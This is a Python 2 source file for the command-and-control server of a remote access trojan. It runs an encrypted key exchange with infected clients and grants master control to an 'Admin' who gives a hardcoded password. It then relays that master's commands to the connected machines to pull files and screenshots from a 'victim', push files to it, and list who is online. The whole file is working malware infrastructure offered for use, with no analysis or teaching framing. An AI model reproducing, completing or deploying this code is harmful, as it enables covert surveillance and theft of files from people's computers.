import socket 
from time import sleep
import select
import os
import sys
import getopt
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES
import base64
from gc import collect

BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = os.urandom(BLOCK_SIZE)
cipher = AES.new(secret)

# Generate a private key
def GenerateKey():                                             
	random_generator = Random.new().read
	key = RSA.generate(2048, random_generator)
	return key

#Generate the public key from the private one
def GeneratePublicKey(key):
	public_key = key.publickey()
	return public_key

# Convert the public key so that it can be sent
def PEMPublicKey(key):
	return key.exportKey('PEM')

Private_key = GenerateKey()
Public_Key  = GeneratePublicKey(Private_key)
Public_Key_to_send = PEMPublicKey(Public_Key)

# Initiate the communication and sharing keys
def ComInit(s):
	global Public_Key_to_send
	global secret
	s.send(Public_Key_to_send)
	PEM_Public_key = s.recv(1024)
	# print PEM_Public_key
	Public_key_dest = RSA.importKey(PEM_Public_key)
	s.send(Public_key_dest.encrypt(secret, 32)[0])
	to_verify = Private_key.decrypt(s.recv(1024))
	if to_verify == secret :
		return 1
	else:
		return 0

def file_download(client,name,num):
	client.send(EncodeAES(cipher,'OK'))
	with open("/root/Desktop/tempserver/"+name+str(num),"wb") as f :
		while 1:
			data_encoded = client.recv(1024)
			data = DecodeAES(cipher,data_encoded)
			f.write(data)
			if len(data_encoded) < 1024:
				break
	return "/root/Desktop/tempserver/"+name+str(num)

def file_upload(client,path):
	client.send(EncodeAES(cipher,"[+] Ready for Upload!"))
	response=DecodeAES(cipher,client.recv(1024))
	if "OK" in response:
		with open(path,"rb") as f:
			flag=1
			while flag:
				buff=f.read(736)
				if len(buff)<736:
					flag=0
				client.send(EncodeAES(cipher,buff))
				sleep(0.5)
			print "[+] Upload finished!"

class Server():
	def __init__(self, host,port):
		self.host = host
		self.port = port
		try:
			self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			print "[+] The Server has been successfully built."
		except:
			print "[-] The Server couldn't be build."
	def start(self):
		try:
			self.socket.bind((self.host,self.port))
			self.socket.listen(5)
			print "[+] The Server has been successfully started and is listening on port : "+str(self.port)+"."
		except:
			print "[-] The Server couldn't be started."
	def run(self):
		print "[+] The Server is running ..."
		master = 0
		opens  = []
		pseudo = {}
		c = 0
		while 1:
			rlist,wlist,xlist = select.select([self.socket]+opens,[],[])
			for client in rlist:
				if client is self.socket:
					try:
						new_client,addr = self.socket.accept()
						if ComInit(new_client):
							print "[+]  Connected successfully to the new client."
							opens.append(new_client)
							new_client.send(EncodeAES(cipher,"<SERVER>: Please give us your pseudo.\n"))
							nick = DecodeAES(cipher,new_client.recv(1024))
							pseudo[new_client] = nick
							if nick == "Admin":
								new_client.send(EncodeAES(cipher,"<SERVER>: Welcome Master, confirm your id.\n"))
								password = DecodeAES(cipher,new_client.recv(1024))
								if password == "fucksociety":
										master = new_client
							# print nick
							new_client.send(EncodeAES(cipher,"<SERVER>: Welcome to our server.\n"))
						else :
							new_client.send("NO !")
							new_client.close()
							print "[-] Failed to connect to the new client."
					except:
						print "[-] Except : Failed to connect to the new client."
				else:
					msg = ""
					while 1:
						buff_encoded = client.recv(1024)
						buff = DecodeAES(cipher,buff_encoded)
						if len(buff_encoded) < 1024:
							msg += buff
							break
						msg += buff
					try:
						if msg == "" :
							opens.remove(client)
							print "[-] "+pseudo[client]+" disconnected."
							del pseudo[client]
						else:
							if 'GET' in msg:
								c += 1
								target = msg.split('*$:')[1]
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(EncodeAES(cipher,msg+"\r\n"))
								ack = DecodeAES(cipher,target_sock.recv(1024))
								if 'Ready' in ack:
									print "[+] Downloading from target !"
									path = file_download(target_sock,pseudo[client],c)
									print "[+] Uploading to Master"
									file_upload(master,path)
							elif 'CLOSE' in msg:
								target = msg.split('*$:')[1]
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(EncodeAES(cipher,'FUCK YOU'))
								master.send(EncodeAES(cipher,"<SERVER> : "+pseudo[target_sock]+" was disconnected.\n"))
								opens.remove(target_sock)
								print "[-] "+pseudo[target_sock]+" disconnected."
								del pseudo[client]
							elif 'UP' in msg:
								c += 1
								target = msg.split('*$:')[1]
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(EncodeAES(cipher,msg+"\r\n"))
								ack = DecodeAES(cipher,master.recv(1024))
								if 'Ready' in ack:
									path = file_download(master,pseudo[master],c)
									master.send(EncodeAES(cipher,'Done!'))
									file_upload(target_sock,path)
							elif 'Who is up' in msg:
								master.send(EncodeAES(cipher,str(pseudo.values())))
							elif 'cd' in msg:
								master.send(EncodeAES(cipher,'Ok\r\n'))
							elif 'chmod' in msg:
								master.send(EncodeAES(cipher,'Ok\r\n'))
							elif 'Screenshot' in msg:
								target = msg.split('*$:')[1]
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(EncodeAES(cipher,msg+"\r\n"))
								ack = DecodeAES(cipher,target_sock.recv(1024))
								if 'Ready' in ack:
									path = file_download(target_sock,pseudo[client],c)
									file_upload(master,path)
							elif 'TAKE' in msg:
								target = msg.split('*$:')[1]
								print 'Yes'
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(EncodeAES(cipher,msg+"\r\n"))
								print 'Forward message to victim'
								ack = DecodeAES(cipher,target_sock.recv(1024))
								if 'Ready' in ack:
									print 'Ready to download.'
									path = file_download(target_sock,pseudo[client],c)
									file_upload(master,path)
							else:
								if client is not master:
									master.send(EncodeAES(cipher,msg+"\r\n"))
								else:
									target = msg.split('*$:')[0]
									for i,j in pseudo.iteritems():
										if j == target:
											target_sock = i
									target_sock.send(EncodeAES(cipher,msg.split('*$:')[1]+"\n"))
					except:
						print "[-] Something went wrong !"
			collect()

def main():
	if not len(sys.argv[1:]):
		sys.exit(0)	
	try:
		opts,args = getopt.getopt(sys.argv[1:],"h:p:",["host","port"])
	except :
		sys.exit(0)

	for o,a in opts:
		if o in ("-p","--port")  :
			port = int(a)
		elif o in ("-h","--host")  :
			host = a
		else :
			sys.exit(0)
	ser = Server(host,port)
	ser.start()
	ser.run()

if __name__ == '__main__':
	main()